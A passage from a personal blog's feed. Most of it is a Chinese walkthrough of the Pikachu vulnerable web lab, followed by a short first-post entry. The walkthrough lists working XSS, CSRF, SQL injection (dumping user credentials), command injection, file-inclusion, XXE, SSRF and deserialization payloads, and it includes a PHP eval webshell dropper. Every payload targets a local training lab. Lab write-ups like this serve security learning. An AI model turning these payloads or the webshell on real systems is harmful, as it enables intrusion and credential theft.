class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="3-存储型xss"><a href="#3-存储型xss" class="headerlink" title="3.存储型xss"></a>3.存储型xss</h4><p>也是输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="4-DOM型xss"><a href="#4-DOM型xss" class="headerlink" title="4.DOM型xss"></a>4.DOM型xss</h4><p>f12看到提示</p><pre><code>                function domxss()&#123;                    var str = document.getElementById(&quot;text&quot;).value;                    document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;;                &#125;                //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;                //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行</code></pre><p>输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span>leon<span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f2e4b09e.png"></p><p>原理就是提前闭合，让href的属性为onclick</p><h4 id="5-xss盲打"><a href="#5-xss盲打" class="headerlink" title="5.xss盲打"></a>5.xss盲打</h4><p>上下两个框都填上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后根据提示登录留言板后台，就弹窗了</p><h4 id="6-xss之过滤"><a href="#6-xss之过滤" class="headerlink" title="6.xss之过滤"></a>6.xss之过滤</h4><p>过滤script,大小写绕过</p><h4 id="7-xss之htmlspecialchars"><a href="#7-xss之htmlspecialchars" class="headerlink" title="7.xss之htmlspecialchars"></a>7.xss之htmlspecialchars</h4><p>specialchars函数会把单双引号和尖括号都转义了，但是试了一下这里没过滤单引号</p><p>playload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="8-xss之href输出"><a href="#8-xss之href输出" class="headerlink" title="8.xss之href输出"></a>8.xss之href输出</h4><p>过滤单双引号，用伪协议绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="9-xss之js输出"><a href="#9-xss之js输出" class="headerlink" title="9.xss之js输出"></a>9.xss之js输出</h4><p>提前闭合第一个script</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="1-CSRF-get-login"><a href="#1-CSRF-get-login" class="headerlink" title="1.CSRF(get) login"></a>1.CSRF(get) login</h4><p>抓包修改个人信息，用burp生成csrf poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>打开链接：<a href="http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb">http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb</a></p><p>发现成功修改（kobe账户需处于登录状态）</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2f262ca.png"></p><h4 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2.CSRF(post)"></a>2.CSRF(post)</h4><p>改成post传参，其他和1相同，不多赘述</p><h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3.CSRF Token"></a>3.CSRF Token</h4><p>遇到token还是不会</p><p>搜了一下要用到burp的CSRF Token Tracker插件</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2fdde2f.png"></p><p>添加如图的规则</p><p>然后生成poc</p><h3 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h3><h4 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h4><p>抓包，直接放playload吧</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span><span class="operator">/</span><span class="operator">/</span>爆库名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="operator">/</span><span class="operator">/</span>爆表名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="operator">/</span><span class="operator">/</span>爆列名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users<span class="operator">/</span><span class="operator">/</span>爆账号密码</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f30df172.png"></p><p>爆出来了</p><h4 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h4><p>注意闭合，其他和1一样</p><p>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users#</span><br></pre></td></tr></table></figure><h4 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h4><p>只是多了一列</p><p>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select username,password,1 from pikachu.users#</span></span><br></pre></td></tr></table></figure><h4 id="4-XX型注入"><a href="#4-XX型注入" class="headerlink" title="4. XX型注入"></a>4. XX型注入</h4><p>用 ‘) 来闭合</p><p>playlaod:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union selct username,password from users #</span></span><br></pre></td></tr></table></figure><h4 id="5-insert-update注入"><a href="#5-insert-update注入" class="headerlink" title="5. insert&#x2F;update注入"></a>5. insert&#x2F;update注入</h4><p>没有回显，使用报错注入</p><p>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="6-Delete注入"><a href="#6-Delete注入" class="headerlink" title="6.Delete注入"></a>6.Delete注入</h4><p>还挺新颖的，留言板无法注入，随便输入，然后删除，抓包</p><p>抓包发现get传了一个id，那么利用id注入，还是用报错注入</p><p>注意：</p><p>一些关键字如#，空格需要进行URL格式转换</p><h4 id="7-http头注入"><a href="#7-http头注入" class="headerlink" title="7.http头注入"></a>7.http头注入</h4><p>根据提示登录抓包，用user-agent进行注入</p><p>playlaod:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span><span class="operator">^</span><span class="string">&#x27;,password)) from users),1,31),0x7e),1) or &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f31e2046.png"></p><h4 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8.布尔盲注"></a>8.布尔盲注</h4><p>上python脚本吧，把做sql的题目的脚本捡起来改改</p><p><img src="https://bu.dusays.com/2023/11/03/65450f330b8d8.png"></p><p>脚本就是方便啊</p><h4 id="9-延时盲注"><a href="#9-延时盲注" class="headerlink" title="9.延时盲注"></a>9.延时盲注</h4><p>把上面的脚本改改，延时耗时太长了，不赘述了</p><h4 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10. 宽字节注入"></a>10. 宽字节注入</h4><p>lili%df’ or 1&#x3D;2 </p><p>继续改布尔盲注的脚本吧</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="1-exec-“ping”"><a href="#1-exec-“ping”" class="headerlink" title="1.exec “ping”"></a>1.exec “ping”</h4><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 |whoami</span><br></pre></td></tr></table></figure><h4 id="2-exec-“eval”"><a href="#2-exec-“eval”" class="headerlink" title="2.exec “eval”"></a>2.exec “eval”</h4><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h4><p>图片路径可修改，改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini</p><p>成功查win.ini文件，那么我们在本地写一个木马，就能通过这种方式用蚁剑连接了</p><h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h4><p>创建一个shell.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[leon])  ?&gt; &#x27;</span> ); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\phpstudy_pro\WWW\pikachu\vul\fileinclude\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2023/11/03/65450f33cd1da.png"></p><p>成功生成shell.php，蚁剑连接</p><h3 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h3><h4 id="1-不安全的文件下载"><a href="#1-不安全的文件下载" class="headerlink" title="1.不安全的文件下载"></a>1.不安全的文件下载</h4><p>想找科比的路径，看到了有意思的东西</p><p><img src="https://bu.dusays.com/2023/11/03/65450f34ac402.png"></p><p>修改路径</p><p><img src="https://bu.dusays.com/2023/11/03/65450f3584d1d.png"></p><p>点击成功下载</p><h3 id="Unsafe-file-upload"><a href="#Unsafe-file-upload" class="headerlink" title="Unsafe file upload"></a>Unsafe file upload</h3><h4 id="1-客户端check"><a href="#1-客户端check" class="headerlink" title="1.客户端check"></a>1.客户端check</h4><p>这里抓包改后缀或者浏览器关闭js都可以，我选择后者</p><h4 id="2-服务端check"><a href="#2-服务端check" class="headerlink" title="2.服务端check"></a>2.服务端check</h4><p>这里直接抓包改后缀就行</p><h4 id="3-getimagesize"><a href="#3-getimagesize" class="headerlink" title="3.getimagesize()"></a>3.getimagesize()</h4><p>大小不对的图片会被打回来，先在正常图片中插入一句话木马，但不会执行php语句，只能结合上上关的文件包含漏洞</p><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h3 id="Over-permission"><a href="#Over-permission" class="headerlink" title="Over permission"></a>Over permission</h3><h4 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1.水平越权"></a>1.水平越权</h4><p><img src="https://bu.dusays.com/2023/11/03/65450f364fa01.png"></p><p>在url这里把username改成别的用户</p><h4 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h4><p>登录admin账户，点击添加账户，并且记住url:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><p>登录普通pikachu账户，然后直接复制上面的链接进行添加账户，再登录admin账户，发现成功添加，那么就存在垂直越权。</p><h3 id=""><a href="#" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h3><h4 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1.目录遍历"></a>1.目录遍历</h4><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini</span><br></pre></td></tr></table></figure><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><h4 id="1-find-abc"><a href="#1-find-abc" class="headerlink" title="1.find abc"></a>1.find abc</h4><p><img src="https://bu.dusays.com/2023/11/03/65450f3723338.png"></p><p>f12找到账户</p><p><img src="https://bu.dusays.com/2023/11/03/65450f384accc.png"></p><p>黄金时代👍我也很喜欢这一段</p><p><img src="https://bu.dusays.com/2023/11/03/65450f390c059.png"></p><p>可以直接修改url得到敏感信息</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><h4 id="1-PHP反序列化漏洞"><a href="#1-PHP反序列化漏洞" class="headerlink" title="1.PHP反序列化漏洞"></a>1.PHP反序列化漏洞</h4><p>没找到反序列化的代码，试了一下给的playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>发现可以</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="1-XXE漏洞"><a href="#1-XXE漏洞" class="headerlink" title="1.XXE漏洞"></a>1.XXE漏洞</h4><p>playload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="url重定向"><a href="#url重定向" class="headerlink" title="url重定向"></a>url重定向</h3><h4 id="1-不安全的url跳转"><a href="#1-不安全的url跳转" class="headerlink" title="1.不安全的url跳转"></a>1.不安全的url跳转</h4><p><img src="https://bu.dusays.com/2023/11/03/65450f39dfdb7.png"></p><p>如图修改，点击则跳转百度</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="1-SSRF-curl"><a href="#1-SSRF-curl" class="headerlink" title="1.SSRF(curl)"></a>1.SSRF(curl)</h4><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini</span><br></pre></td></tr></table></figure><h4 id="2-SSRF-file-get-content"><a href="#2-SSRF-file-get-content" class="headerlink" title="2.SSRF(file_get_content)"></a>2.SSRF(file_get_content)</h4><p>playload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;YuLin-2023-Recruit-Writeup&quot;&gt;&lt;a href=&quot;#YuLin-2023-Recruit-Writeup&quot; class=&quot;headerlink&quot; title=&quot;YuLin 2023 Recruit Writeup&quot;&gt;&lt;/a&gt;YuLin 20</summary>
      
    
    
    
    <category term="writeup" scheme="https://foreon.github.io/categories/writeup/"/>
    
    
    <category term="ctf" scheme="https://foreon.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇博客</title>
    <link href="https://foreon.github.io/posts/51727.html"/>
    <id>https://foreon.github.io/posts/51727.html</id>
    <published>2023-11-02T12:15:27.000Z</published>
    <updated>2023-11-03T15:41:37.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="我开始写博客了！"><a href="#我开始写博客了！" class="headerlink" title="我开始写博客了！"></a>我开始写博客了！</h1><p><strong>此博客诞生于<mark>2023年11月2日</mark>。</strong></p><p><strong>今后我应该会更新一些随笔、ctf比赛writeup和学习总结。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;我开始写博客了！&quot;&gt;&lt;a href=&quot;#我开始写博客了！&quot; class=&quot;headerlink&quot; title=&quot;我开始写博客了！&quot;&gt;&lt;/a&gt;我开始写博客了！&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;此博客诞生于&lt;mark&gt;2023年11月2日&lt;/mark&gt;。&lt;/strong</summary>
      
    
    
    
    <category term="随笔" scheme="https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="打招呼" scheme="https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"/>
    
  </entry>
  
</feed>
